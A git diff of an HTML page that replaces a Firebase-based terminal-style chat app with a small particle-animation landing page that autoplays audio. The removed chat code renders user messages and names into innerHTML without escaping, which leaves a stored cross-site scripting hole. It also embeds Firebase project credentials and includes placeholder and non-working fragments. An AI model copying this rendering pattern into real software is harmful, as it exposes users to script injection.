@@ -1,879 +1,242 @@
-<!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Codex Chat - Advanced</title>
-  <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
-  <script src="https://cdn.tailwindcss.com"></script>
-  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-auth.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-storage.js"></script>
-  <style>
-    body {
-      background: #0a0a0a;
-      font-family: 'Courier New', monospace;
-      color: #00ff00;
-      margin: 0;
-      height: 100vh;
-      display: flex;
-      flex-direction: column;
-      overflow: hidden;
-    }
-    .crt::before, .crt::after, .scanline { /* CRT styles... */ }
-    @keyframes scan, @keyframes glitch, @keyframes smoke, @keyframes pulse, @keyframes bounce { /* Keyframes... */ }
-
-    .crt::before {
-      content: '';
-      position: fixed;
-      top: 0; left: 0; right: 0; bottom: 0;
-      background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%),
-                  linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06));
-      z-index: 2;
-      background-size: 100% 2px, 3px 100%;
-      pointer-events: none;
-    }
-    .crt::after {
-      content: '';
-      position: fixed;
-      top: 0; left: 0; right: 0; bottom: 0;
-      background: rgba(18, 16, 16, 0.1);
-      z-index: 3;
-      pointer-events: none;
-    }
-    .scanline {
-      position: fixed;
-      top: 0; left: 0; right: 0;
-      height: 100%;
-      background: linear-gradient(0deg, transparent, rgba(0, 255, 0, 0.1), transparent);
-      animation: scan 7.5s linear infinite;
-      pointer-events: none;
-      z-index: 4;
-    }
-    @keyframes scan {
-      0% { transform: translateY(-100%); }
-      100% { transform: translateY(100%); }
-    }
-    .terminal {
-      background: rgba(0, 0, 0, 0.8);
-      flex: 1;
-      display: flex;
-      flex-direction: column;
-      overflow: hidden;
-      position: relative;
-    }
-    .output {
-      flex: 1;
-      overflow-y: auto;
-      scrollbar-color: #00ff00 #0a0a0a;
-      padding: 1rem;
-      background: rgba(0, 0, 0, 0.9);
-      scroll-behavior: smooth;
-    }
-    .output::-webkit-scrollbar { width: 8px; }
-    .output::-webkit-scrollbar-track { background: #0a0a0a; }
-    .output::-webkit-scrollbar-thumb { background: #00ff00; }
-    
-    .chat-title { /* Styles for chat-title... */ }
-    @keyframes smoke { /* Keyframes for smoke... */ }
-    .message-card { /* Base message card style... */ }
-    .message-self {
-        align-self: flex-end;
-        background: rgba(0, 255, 0, 0.2); /* Slightly darker green for self */
-        border: 1px solid rgba(0, 255, 0, 0.3); /* Border for self */
-    }
-    .message-other {
-        align-self: flex-start;
-        background: rgba(0, 0, 0, 0.7); /* Darker background for others */
-        border: 1px solid rgba(0, 255, 0, 0.1);
-    }
-    .message-container {
-        display: flex;
-        width: 100%;
-        margin-bottom: 0.5rem;
-    }
-    .message-username { font-weight: bold; color: #00ff00; }
-    .message-text { color: #ccffcc; }
-    .animated-date, .animated-time { /* Styles for date/time... */ }
-    @keyframes pulse { /* Keyframes for pulse... */ }
-
-    /* Voice Message Liquid Animation Placeholder */
-    .voice-msg-bar {
-        height: 15px;
-        width: 3px;
-        background: #00ff00;
-        margin: 0 1px;
-        display: inline-block;
-        animation: liquidPulse 0.8s infinite alternate ease-in-out;
-    }
-    @keyframes liquidPulse {
-        from { transform: scaleY(0.2); }
-        to { transform: scaleY(1.0); }
-    }
-    .voice-msg-bar:nth-child(2n) { animation-delay: 0.1s; }
-    .voice-msg-bar:nth-child(3n) { animation-delay: 0.2s; }
-    .voice-msg-bar:nth-child(4n) { animation-delay: 0.3s; }
-    .voice-msg-bar:nth-child(5n) { animation-delay: 0.4s; }
-    
-    /* Media/Attachment Popup */
-    #attachment-popup {
-        position: absolute;
-        bottom: 70px;
-        right: 10px;
-        background: rgba(0, 0, 0, 0.9);
-        border: 1px solid #00ff00;
-        padding: 10px;
-        z-index: 10;
-        border-radius: 8px;
-    }
-    
-    /* Mention Popup */
-    #mention-popup {
-        position: absolute;
-        bottom: 70px;
-        left: 10px;
-        background: rgba(0, 0, 0, 0.9);
-        border: 1px solid #00ff00;
-        padding: 10px;
-        z-index: 10;
-        border-radius: 8px;
-        max-height: 200px;
-        overflow-y: auto;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CODEX-SERVER</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"></link>
+    <style>
+        body {
+            background-color: #0d1117;
+            overflow: hidden;
+        }
+        canvas {
+            position: absolute;
+            top: 0;
+            left: 0;
+            z-index: -1;
+        }
+    </style>
 </head>
-<body class="crt">
-  <div class="scanline"></div>
-  <div class="terminal">
-
-    <div id="authInterface" class="flex flex-col items-center justify-center h-full p-4">
-      <h2 class="text-3xl font-bold mb-6 glitch">CODEX CHAT LOGIN</h2>
-      <div class="w-full max-w-sm">
-        <input id="auth-username" type="text" class="w-full p-3 mb-4 bg-black border border-green-500 text-green-500 focus:outline-none" placeholder="Username">
-        <input id="auth-password" type="password" class="w-full p-3 mb-4 bg-black border border-green-500 text-green-500 focus:outline-none" placeholder="Password">
-        <div class="mb-4">
-          <label class="block text-sm font-bold mb-2">Choose Profile Icon:</label>
-          <div id="icon-picker" class="flex justify-around text-3xl">
-            <span class="icon-option cursor-pointer" data-icon="👽">👽</span>
-            <span class="icon-option cursor-pointer" data-icon="🤖">🤖</span>
-            <span class="icon-option cursor-pointer" data-icon="👾">👾</span>
-            <span class="icon-option cursor-pointer" data-icon="😎">😎</span>
-          </div>
-          <input type="hidden" id="selected-icon" value="👽">
-        </div>
-        <button id="loginButton" class="w-full p-3 bg-green-500 text-black hover:bg-green-400 mb-2 font-bold">Log In</button>
-        <button id="signupButton" class="w-full p-3 bg-gray-700 text-green-500 hover:bg-gray-600 font-bold">Sign Up</button>
-        <p id="auth-error" class="text-red-500 mt-2"></p>
-      </div>
-    </div>
-
-    <div id="chatInterface" class="flex flex-col h-full hidden">
-      <div class="flex items-center justify-between p-3 bg-black border-b border-green-500">
-        <div class="flex items-center cursor-pointer" id="openProfile">
-          <span id="myProfileIcon" class="text-2xl mr-2">👽</span>
-          <span id="currentUsernameDisplay" class="font-bold text-lg"></span>
-        </div>
-        <div class="flex items-center">
-          <button id="groupCallButton" class="px-3 py-1 bg-blue-600 text-white rounded-full text-sm mr-2 hover:bg-blue-500">📞 Group Call</button>
-          <div id="online-indicator" class="w-3 h-3 bg-green-500 rounded-full animate-pulse" title="Online"></div>
-        </div>
-      </div>
-
-      <div id="messages" class="output">
-        <div id="newMessageIndicator" class="sticky top-0 bg-yellow-900 text-yellow-300 text-center p-1 hidden cursor-pointer">
-            New messages available! Click to scroll.
-        </div>
-      </div>
-
-      <div id="typingIndicator" class="p-2 text-sm italic text-gray-400 hidden">
-        <span class="font-bold"></span> is typing...
-      </div>
-
-      <div class="input-container flex items-end">
-        
-        <div id="attachment-popup" class="hidden flex-col p-2">
-            <label class="p-2 hover:bg-green-800 cursor-pointer">
-                🖼️ Photo/Video
-                <input type="file" accept="image/*,video/*" class="hidden" onchange="handleAttachment(this, 'once')">
-            </label>
-            <label class="p-2 hover:bg-green-800 cursor-pointer">
-                🎤 Audio/File
-                <input type="file" accept="audio/*,.zip,.pdf" class="hidden" onchange="handleAttachment(this, 'file')">
-            </label>
-        </div>
-
-        <button id="attachmentButton" class="p-3 text-2xl hover:text-green-400">📎</button>
-        
-        <div class="flex-grow relative">
-          <input id="messageInput" type="text" class="w-full p-2 bg-black border border-green-500 text-green-500 focus:outline-none pr-10" placeholder="Message">
-          
-          <div id="emojiPicker" class="absolute top-0 right-0 p-2 text-2xl cursor-pointer">😀</div>
-          
-          <div id="mention-popup" class="hidden"></div>
-        </div>
-        
-        <button id="voiceStartButton" class="ml-2 p-3 text-2xl bg-red-600 text-white rounded-full hover:bg-red-500" title="Start Voice Message">
-            🎙️
-        </button>
-        <button id="sendMessage" class="ml-2 px-4 py-2 bg-green-500 text-black hover:bg-green-400 hidden font-bold">Send</button>
-      </div>
-      
-      <div id="voiceRecordingUI" class="p-4 bg-gray-900 hidden">
-          <div class="flex items-center justify-between">
-              <span id="recTimer">00:00</span>
-              <div id="liquidAnim" class="flex h-6 items-center">
-                  <div class="voice-msg-bar" style="animation-delay: 0s;"></div>
-                  <div class="voice-msg-bar" style="animation-delay: 0.1s;"></div>
-                  <div class="voice-msg-bar" style="animation-delay: 0.2s;"></div>
-                  <div class="voice-msg-bar" style="animation-delay: 0.3s;"></div>
-                  <div class="voice-msg-bar" style="animation-delay: 0.4s;"></div>
-              </div>
-              <button id="voiceCancel">❌ Cancel</button>
-              <button id="voiceSend">⬆️ Send</button>
-          </div>
-      </div>
-
-    </div>
-
-    <div id="profileInterface" class="absolute inset-0 bg-black z-20 p-4 hidden flex-col">
-        <button id="profileBack" class="text-xl mb-4 self-start">← Back</button>
-        <h2 class="text-3xl font-bold mb-6">User Profile</h2>
-        <div class="flex items-center mb-6">
-            <span id="profileIconDisplay" class="text-7xl mr-4">👽</span>
-            <div>
-                <p id="profileNameDisplay" class="text-2xl font-bold mb-2"></p>
-                <p id="profileEmailDisplay" class="text-sm text-gray-400"></p>
+<body class="flex items-center justify-center min-h-screen">
+    <canvas id="canvas"></canvas>
+    <div class="bg-black p-8 rounded-lg shadow-lg w-80 relative z-10">
+        <div class="flex justify-center mb-6">
+            <div class="border border-gray-500 p-4 rounded-full">
+                <span class="text-white text-4xl">Ｄ〆</span>
             </div>
         </div>
-
-        <div id="myProfileActions" class="w-full max-w-md mx-auto">
-            <p class="mb-2">Change Username:</p>
-            <input id="newUsernameInput" type="text" class="w-full p-3 mb-4 bg-black border border-green-500 text-green-500 focus:outline-none">
-            <button id="updateUsernameButton" class="w-full p-3 bg-green-500 text-black hover:bg-green-400 mb-2 font-bold">Update Name</button>
-            <button id="logoutButton" class="w-full p-3 bg-red-600 text-white hover:bg-red-500 font-bold">Log Out</button>
+        <div class="text-center text-gray-400">
+            <p class="mb-4">Welcome to the My Server. Click Background And Enjoy Effect!</p>
+            <p>Hello dear I'm DX-CODEX</p>
         </div>
+        <audio id="audio" autoplay>
+            <source src="https://cdn.glitch.global/b81484d9-692a-4a73-b45b-1fea3c3bcb05/HI_HI_HA_HA!(256k).mp3?v=1739729489116" type="audio/mpeg">
+            Your browser does not support the audio element.
+        </audio>
     </div>
 
-    <div id="groupCallInterface" class="absolute inset-0 bg-black z-20 p-4 hidden flex-col">
-        <button id="callBack" class="text-xl mb-4 self-start">← Back to Chat</button>
-        <h2 class="text-3xl font-bold mb-6 text-center">Group Voice Chat</h2>
-        <div id="callUsers" class="flex flex-col items-center justify-center flex-1">
-            <p class="text-xl mb-4">Users in Call:</p>
-            <div id="userList" class="flex flex-wrap justify-center">
-                <div class="m-2 p-3 bg-gray-800 rounded-lg text-center">
-                    <span class="text-4xl block">👤</span>
-                    <span class="block">User 1</span>
-                </div>
-            </div>
-        </div>
-        <div class="flex justify-center p-4">
-            <button id="muteToggle" class="p-4 mx-2 bg-yellow-600 text-white rounded-full text-2xl hover:bg-yellow-500">🔇</button>
-            <button id="endCall" class="p-4 mx-2 bg-red-600 text-white rounded-full text-2xl hover:bg-red-500">Hang Up 📞</button>
-        </div>
-    </div>
-    
-    <div id="notificationToast" class="fixed top-4 right-4 bg-green-800 text-white p-3 rounded-lg shadow-lg hidden z-50">
-        New Message from <span id="notif-username" class="font-bold"></span>
-    </div>
+    <script>
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
 
-  </div>
+        let particlesArray = [];
 
-<script>
-    // === Firebase Config (Redundant here, but ensures it's present) ===
-    const firebaseConfig = {
-      apiKey: "AIzaSyAlPc5ggTLhWw2-k6G5Xw9K7qI3t0cQjP6m", 
-      authDomain: "mahi-chat-4dd1b.firebaseapp.com",
-      databaseURL: "https://mahi-chat-4dd1b-default-rtdb.firebaseio.com",
-      projectId: "mahi-chat-4dd1b",
-      storageBucket: "mahi-chat-4dd1b.appspot.com",
-      messagingSenderId: "590135005998",
-      appId: "1:590135005998:web:your-app-id"
-    };
-
-    // Initialize Firebase (Only if not already initialized)
-    if (!firebase.apps.length) {
-        firebase.initializeApp(firebaseConfig);
-    }
-    const auth = firebase.auth();
-    const db = firebase.database();
-    const storage = firebase.storage();
-
-    let currentUser = null;
-    let currentUsername = '';
-    let currentIcon = '👽';
-
-    // --- Utility Functions ---
-
-    /** Formats a Firebase timestamp into 'X min ago' or 'Day HH:MM' */
-    function formatTimestamp(timestamp) {
-        const now = new Date();
-        const past = new Date(timestamp);
-        const diffSeconds = Math.floor((now - past) / 1000);
-        const diffMinutes = Math.floor(diffSeconds / 60);
-        const diffHours = Math.floor(diffMinutes / 60);
-        const diffDays = Math.floor(diffHours / 24);
-
-        if (diffMinutes < 1) return 'Just now';
-        if (diffHours < 1) return `${diffMinutes} min ago`;
-        if (diffDays < 1) return `Today ${past.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit' })}`;
-        if (diffDays < 7) return past.toLocaleDateString('en-US', { weekday: 'short' }) + ' ' + past.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit' });
-        
-        return past.toLocaleDateString('en-US');
-    }
-
-    /** Shows a notification toast */
-    function showNotification(username, message) {
-        const toast = document.getElementById('notificationToast');
-        document.getElementById('notif-username').textContent = username;
-        // Optionally show message content too
-        toast.classList.remove('hidden');
-        setTimeout(() => toast.classList.add('hidden'), 3000);
-    }
-    
-    /** Finds all online users for mention */
-    async function getOnlineUsers() {
-        const snapshot = await db.ref('users').once('value');
-        const users = snapshot.val();
-        return users ? Object.values(users).filter(u => u.isOnline).map(u => u.username) : [];
-    }
-
-    // --- Core UI Functions ---
-
-    /** Renders the chat message into HTML */
-    function createMessageElement(messageData, key) {
-        const isSelf = messageData.username === currentUsername;
-        const alignClass = isSelf ? 'justify-end' : 'justify-start';
-        const cardClass = isSelf ? 'message-card message-self' : 'message-card message-other';
-        const timestamp = formatTimestamp(messageData.timestamp);
-        
-        let content = '';
-        if (messageData.type === 'text') {
-            content = `<span class="message-text">${messageData.text}</span>`;
-        } else if (messageData.type === 'voice') {
-            const bars = Array(10).fill().map((_, i) => `<div class="voice-msg-bar" style="animation-delay: ${i * 0.05}s;"></div>`).join('');
-            content = `
-                <div class="flex items-center">
-                    <button class="text-2xl mr-2" onclick="playVoiceMessage('${key}')">▶️</button>
-                    <div class="flex items-center h-8 bg-gray-700 rounded-full p-1" style="width: 150px;">
-                        ${bars}
-                    </div>
-                    <span class="ml-2">${(messageData.duration || '0:05')}</span>
-                </div>
-            `;
-        } else if (messageData.type === 'media') {
-            content = `<a href="${messageData.url}" target="_blank" class="text-blue-400 hover:underline">
-                ${messageData.fileType === 'image' ? '🖼️ View Image' : messageData.fileType === 'video' ? '📹 View Video' : '📎 Download File'}
-                ${messageData.viewOnce ? ' (View Once)' : ''}
-            </a>`;
-        }
-
-        let replyHtml = '';
-        if (messageData.replyTo) {
-            replyHtml = `<div class="p-1 mb-2 border-l-4 border-yellow-500 text-sm bg-black/50">
-                Replying to: <b>${messageData.replyTo.username}</b>: ${messageData.replyTo.text.substring(0, 30)}...
-            </div>`;
-        }
-
-        return `
-            <div class="message-container ${alignClass}" data-key="${key}" data-username="${messageData.username}" data-text="${messageData.text}" oncontextmenu="handleRightClick(event, '${key}')">
-                <div class="${cardClass} flex flex-col cursor-pointer" style="max-width: 80%;"
-                     ontouchstart="handleTouchStart(event, '${key}')" ontouchend="handleTouchEnd(event, '${key}')"
-                     onclick="openOtherUserProfile('${messageData.username}')">
-                    <div class="flex items-center mb-1">
-                        <span class="text-xl mr-2" onclick="openOtherUserProfile('${messageData.username}')">${messageData.icon || '👤'}</span>
-                        <span class="message-username" onclick="openOtherUserProfile('${messageData.username}')">${messageData.username}</span>
-                    </div>
-                    ${replyHtml}
-                    ${content}
-                    <div class="text-xs mt-1 text-gray-400 self-end">${timestamp}</div>
-                </div>
-            </div>
-        `;
-    }
-    
-    // --- Message Management ---
-    
-    function fetchMessages() {
-        const messagesDiv = document.getElementById('messages');
-        const wasAtBottom = messagesDiv.scrollTop + messagesDiv.clientHeight >= messagesDiv.scrollHeight - 50;
-        let lastMessageKey = null;
-
-        db.ref('messages').limitToLast(100).on('value', (snapshot) => {
-            const messages = snapshot.val();
-            if (!messages) { messagesDiv.innerHTML = ''; return; }
-
-            const messageKeys = Object.keys(messages);
-            const newLastKey = messageKeys[messageKeys.length - 1];
-
-            const messageHTML = messageKeys.map(key => createMessageElement(messages[key], key)).join('');
-            messagesDiv.innerHTML = messageHTML;
-
-            if (wasAtBottom || lastMessageKey === null) {
-                messagesDiv.scrollTop = messagesDiv.scrollHeight;
-            } else if (newLastKey !== lastMessageKey) {
-                // New message arrived and user is not at bottom
-                showNotification(messages[newLastKey].username, messages[newLastKey].text);
-                document.getElementById('newMessageIndicator').classList.remove('hidden');
+        class Particle {
+            constructor(x, y) {
+                this.x = x;
+                this.y = y;
+                this.size = Math.random() * 5 + 1;
+                this.speedX = Math.random() * 3 - 1.5;
+                this.speedY = Math.random() * 3 - 1.5;
+                this.color = 'cyan';
             }
-            
-            lastMessageKey = newLastKey;
-        });
-        
-        // Scroll listener for new message indicator
-        messagesDiv.addEventListener('scroll', () => {
-            if (messagesDiv.scrollTop + messagesDiv.clientHeight >= messagesDiv.scrollHeight - 50) {
-                document.getElementById('newMessageIndicator').classList.add('hidden');
+            update() {
+                this.x += this.speedX;
+                this.y += this.speedY;
+                if (this.size > 3.0) this.size -= 0.1;
             }
-        });
-        document.getElementById('newMessageIndicator').onclick = () => {
-            messagesDiv.scrollTop = messagesDiv.scrollHeight;
-        };
-    }
-    
-    // Send message logic (simplified to Firebase)
-    async function sendMessage(type = 'text', content) {
-        if (!currentUser || !content) return;
-
-        const messageData = {
-            username: currentUsername,
-            icon: currentIcon,
-            uid: currentUser.uid,
-            timestamp: firebase.database.ServerValue.TIMESTAMP,
-            type: type,
-            text: type === 'text' ? content : (content.text || ''),
-            // Add reply info if any
-            replyTo: window.replyingTo ? { username: window.replyingTo.username, text: window.replyingTo.text } : null,
-        };
-        
-        // Clear reply state
-        window.replyingTo = null;
-        
-        await db.ref('messages').push(messageData);
-        document.getElementById('messageInput').value = '';
-        document.getElementById('sendMessage').classList.add('hidden');
-        document.getElementById('voiceStartButton').classList.remove('hidden');
-    }
-    
-    // --- Interactive Message Features (Reply/Edit/Delete) ---
-    let touchStartTime = 0;
-    let touchStartX = 0;
-    
-    function handleTouchStart(e, key) {
-        touchStartTime = new Date().getTime();
-        touchStartX = e.touches[0].clientX;
-        // Prevent default behavior (scrolling) if we detect a horizontal swipe
-        // e.preventDefault(); 
-    }
-    
-    function handleTouchEnd(e, key) {
-        const touchEndTime = new Date().getTime();
-        const touchEndX = e.changedTouches[0].clientX;
-        const swipeDistance = touchEndX - touchStartX;
-        
-        // Check for right swipe (to mention/reply)
-        if (touchEndTime - touchStartTime < 500 && swipeDistance > 50) {
-            const element = document.querySelector(`.message-container[data-key="${key}"]`);
-            const username = element.dataset.username;
-            const text = element.dataset.text;
-            
-            // Set global reply state
-            window.replyingTo = { key, username, text };
-            alert(`Replying to ${username}: ${text.substring(0, 20)}...`);
-            document.getElementById('messageInput').focus();
-        }
-    }
-    
-    function handleRightClick(e, key) {
-        e.preventDefault();
-        // Simple context menu logic for Edit/Delete/Reply
-        const element = document.querySelector(`.message-container[data-key="${key}"]`);
-        const username = element.dataset.username;
-        const isSelf = username === currentUsername;
-
-        const actions = isSelf ? ['Reply', 'Edit', 'Delete'] : ['Reply', 'View Profile'];
-        const action = prompt(`Actions for message by ${username}:\n${actions.join(', ')}`);
-
-        if (action === 'Reply') {
-            const text = element.dataset.text;
-            window.replyingTo = { key, username, text };
-            alert(`Replying to ${username}: ${text.substring(0, 20)}...`);
-            document.getElementById('messageInput').focus();
-        } else if (action === 'Edit' && isSelf) {
-            const newText = prompt('Edit your message:', element.dataset.text);
-            if (newText) {
-                db.ref(`messages/${key}/text`).set(newText);
+            draw() {
+                ctx.fillStyle = this.color;
+                ctx.beginPath();
+                ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
+                ctx.fill();
             }
-        } else if (action === 'Delete' && isSelf) {
-            if (confirm('Are you sure you want to delete this message?')) {
-                db.ref(`messages/${key}`).remove();
-            }
-        } else if (action === 'View Profile' && !isSelf) {
-            openOtherUserProfile(username);
-        }
-    }
-    
-    // --- Authentication & Profile ---
-    
-    // Event listeners for login/signup
-    document.querySelectorAll('.icon-option').forEach(icon => {
-        icon.onclick = () => {
-            document.querySelectorAll('.icon-option').forEach(i => i.style.border = 'none');
-            icon.style.border = '1px solid #00ff00';
-            document.getElementById('selected-icon').value = icon.dataset.icon;
-        };
-    });
-    
-    document.getElementById('loginButton').onclick = async () => {
-        const username = document.getElementById('auth-username').value.trim();
-        const password = document.getElementById('auth-password').value;
-        const icon = document.getElementById('selected-icon').value;
-        
-        if (!username || !password) {
-            document.getElementById('auth-error').textContent = 'Please enter username and password.';
-            return;
         }
 
-        try {
-            // Find user by username in database to get email
-            const userSnapshot = await db.ref('users').orderByChild('username').equalTo(username).once('value');
-            const userData = userSnapshot.val();
-            
-            if (!userData) {
-                document.getElementById('auth-error').textContent = 'User not found. Please sign up.';
-                return;
-            }
-            
-            const userKey = Object.keys(userData)[0];
-            const userEmail = userData[userKey].email;
-            
-            await auth.signInWithEmailAndPassword(userEmail, password);
-            // On success, authStateChanged will handle the rest
-            
-        } catch (error) {
-            document.getElementById('auth-error').textContent = `Login Failed: ${error.message}`;
-        }
-    };
-
-    document.getElementById('signupButton').onclick = async () => {
-        const username = document.getElementById('auth-username').value.trim();
-        const password = document.getElementById('auth-password').value;
-        const icon = document.getElementById('selected-icon').value;
-        const email = `${username.toLowerCase().replace(/[^a-z0-9]/g, '')}@codexchat.com`; // Unique email based on username
-
-        if (password.length < 6) {
-            document.getElementById('auth-error').textContent = 'Password must be at least 6 characters.';
-            return;
-        }
-
-        try {
-            // Check if username already exists
-            const userSnapshot = await db.ref('users').orderByChild('username').equalTo(username).once('value');
-            if (userSnapshot.exists()) {
-                 document.getElementById('auth-error').textContent = 'Username already taken.';
-                 return;
-            }
-            
-            const userCredential = await auth.createUserWithEmailAndPassword(email, password);
-            const uid = userCredential.user.uid;
-            
-            // Save user data to Realtime Database
-            await db.ref(`users/${uid}`).set({
-                username: username,
-                email: email,
-                icon: icon,
-                createdAt: firebase.database.ServerValue.TIMESTAMP,
-                isOnline: true,
-                isMuted: false,
-                role: 'user' // Default role
-            });
-            // On success, authStateChanged will handle the rest
-            
-        } catch (error) {
-            document.getElementById('auth-error').textContent = `Signup Failed: ${error.message}`;
-        }
-    };
-    
-    // Auth State Listener
-    auth.onAuthStateChanged(async (user) => {
-        if (user) {
-            currentUser = user;
-            
-            // Fetch user data
-            const userSnapshot = await db.ref(`users/${user.uid}`).once('value');
-            const userData = userSnapshot.val();
-            
-            if (!userData) {
-                 // Should not happen, but a safeguard
-                await auth.signOut();
-                return;
-            }
-            
-            currentUsername = userData.username;
-            currentIcon = userData.icon || '👽';
-            
-            // Set online status
-            db.ref(`users/${user.uid}/isOnline`).onDisconnect().set(false);
-            db.ref(`users/${user.uid}/isOnline`).set(true);
-
-            // Update UI
-            document.getElementById('authInterface').classList.add('hidden');
-            document.getElementById('chatInterface').classList.remove('hidden');
-            document.getElementById('currentUsernameDisplay').textContent = currentUsername;
-            document.getElementById('myProfileIcon').textContent = currentIcon;
-            
-            fetchMessages(); // Start listening for messages
-            listenForTyping(); // Start typing indicator listener
-        } else {
-            currentUser = null;
-            currentUsername = '';
-            document.getElementById('authInterface').classList.remove('hidden');
-            document.getElementById('chatInterface').classList.add('hidden');
-        }
-    });
-    
-    // Profile Management
-    document.getElementById('openProfile').onclick = () => openUserProfile(currentUsername, true);
-    document.getElementById('profileBack').onclick = () => {
-        document.getElementById('profileInterface').classList.add('hidden');
-        document.getElementById('chatInterface').classList.remove('hidden');
-    };
-    document.getElementById('logoutButton').onclick = () => auth.signOut();
-    
-    async function openUserProfile(username, isOwnProfile) {
-        document.getElementById('chatInterface').classList.add('hidden');
-        document.getElementById('profileInterface').classList.remove('hidden');
-        document.getElementById('myProfileActions').classList.toggle('hidden', !isOwnProfile);
-        document.getElementById('profileBack').classList.remove('hidden');
-
-        // Fetch user data
-        const userSnapshot = await db.ref('users').orderByChild('username').equalTo(username).once('value');
-        const userData = userSnapshot.val();
-        
-        if (!userData) {
-            document.getElementById('profileNameDisplay').textContent = 'User Not Found';
-            document.getElementById('profileEmailDisplay').textContent = '';
-            document.getElementById('profileIconDisplay').textContent = '❓';
-            return;
-        }
-
-        const userKey = Object.keys(userData)[0];
-        const user = userData[userKey];
-        
-        document.getElementById('profileNameDisplay').textContent = user.username;
-        document.getElementById('profileEmailDisplay').textContent = user.email;
-        document.getElementById('profileIconDisplay').textContent = user.icon || '👤';
-
-        if (isOwnProfile) {
-            document.getElementById('newUsernameInput').value = user.username;
-        }
-    }
-    
-    function openOtherUserProfile(username) {
-        if (username !== currentUsername) {
-            openUserProfile(username, false);
-        } else {
-            openUserProfile(username, true);
-        }
-    }
-
-    document.getElementById('updateUsernameButton').onclick = async () => {
-        const newUsername = document.getElementById('newUsernameInput').value.trim();
-        if (newUsername && newUsername !== currentUsername) {
-            try {
-                // Check if new username is available
-                const checkSnapshot = await db.ref('users').orderByChild('username').equalTo(newUsername).once('value');
-                if (checkSnapshot.exists()) {
-                    alert('Username already taken!');
-                    return;
+        function handleParticles() {
+            for (let i = 0; i < particlesArray.length; i++) {
+                particlesArray[i].update();
+                particlesArray[i].draw();
+                for (let j = i; j < particlesArray.length; j++) {
+                    const dx = particlesArray[i].x - particlesArray[j].x;
+                    const dy = particlesArray[i].y - particlesArray[j].y;
+                    const distance = Math.sqrt(dx * dx + dy * dy);
+                    if (distance < 100) {
+                        ctx.beginPath();
+                        ctx.strokeStyle = 'cyan';
+                        ctx.lineWidth = 0.2;
+                        ctx.moveTo(particlesArray[i].x, particlesArray[i].y);
+                        ctx.lineTo(particlesArray[j].x, particlesArray[j].y);
+                        ctx.stroke();
+                        ctx.closePath();
+                    }
                 }
-                
-                // Update username in DB and local state
-                await db.ref(`users/${currentUser.uid}/username`).set(newUsername);
-                currentUsername = newUsername;
-                document.getElementById('currentUsernameDisplay').textContent = newUsername;
-                alert('Username updated successfully!');
-            } catch (error) {
-                alert('Failed to update username: ' + error.message);
+                if (particlesArray[i].size <= 0.3) {
+                    particlesArray.splice(i, 1);
+                    i--;
+                }
             }
         }
-    };
-    
-    // --- Input & Media Handlers ---
-    
-    // Send Button / Enter key
-    document.getElementById('sendMessage').onclick = () => {
-        const message = document.getElementById('messageInput').value.trim();
-        if (message) sendMessage('text', message);
-    };
-    document.getElementById('messageInput').addEventListener('keypress', (e) => {
-        if (e.key === 'Enter') {
-            const message = e.target.value.trim();
-            if (message) sendMessage('text', message);
+
+        function animate() {
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
+            handleParticles();
+            requestAnimationFrame(animate);
         }
-    });
 
-    // Toggle Send/Voice button
-    document.getElementById('messageInput').oninput = () => {
-        const input = document.getElementById('messageInput').value.trim();
-        if (input.length > 0) {
-            document.getElementById('sendMessage').classList.remove('hidden');
-            document.getElementById('voiceStartButton').classList.add('hidden');
-        } else {
-            document.getElementById('sendMessage').classList.add('hidden');
-            document.getElementById('voiceStartButton').classList.remove('hidden');
-        }
-        
-        // Handle Typing Indicator update
-        db.ref(`users/${currentUser.uid}/isTyping`).set(input.length > 0 ? true : false);
-        
-        // Handle Mention Popup
-        if (input.endsWith('@')) {
-            showMentionPopup(input.slice(0, -1));
-        } else if (!input.includes('@')) {
-            document.getElementById('mention-popup').classList.add('hidden');
-        }
-    };
-    
-    // Attachment Button
-    document.getElementById('attachmentButton').onclick = () => {
-        document.getElementById('attachment-popup').classList.toggle('hidden');
-    };
-    
-    function handleAttachment(inputElement, viewType) {
-        const file = inputElement.files[0];
-        if (!file) return;
-        document.getElementById('attachment-popup').classList.add('hidden');
-        
-        // Placeholder for real file upload (Firebase Storage)
-        alert(`Uploading ${file.name} (${file.type}). View type: ${viewType}. (Actual upload logic needs to be implemented)`);
-
-        // Mock message send
-        sendMessage('media', { 
-            fileName: file.name, 
-            fileType: file.type.split('/')[0], 
-            url: '#', // Placeholder URL
-            viewOnce: viewType === 'once' 
-        });
-        
-        // Reset input
-        inputElement.value = null;
-    }
-    
-    // Voice Message (Placeholder for MediaRecorder API)
-    document.getElementById('voiceStartButton').onclick = () => {
-        document.getElementById('voiceRecordingUI').classList.remove('hidden');
-        document.getElementById('input-container').classList.add('hidden');
-        
-        // Start recording animation/timer...
-        let seconds = 0;
-        const timerInterval = setInterval(() => {
-            seconds++;
-            const min = String(Math.floor(seconds / 60)).padStart(2, '0');
-            const sec = String(seconds % 60).padStart(2, '0');
-            document.getElementById('recTimer').textContent = `${min}:${sec}`;
-        }, 1000);
-
-        window.voiceState = { interval: timerInterval, duration: seconds };
-    };
-    
-    document.getElementById('voiceCancel').onclick = () => {
-        clearInterval(window.voiceState.interval);
-        document.getElementById('voiceRecordingUI').classList.add('hidden');
-        document.getElementById('input-container').classList.remove('hidden');
-    };
-    
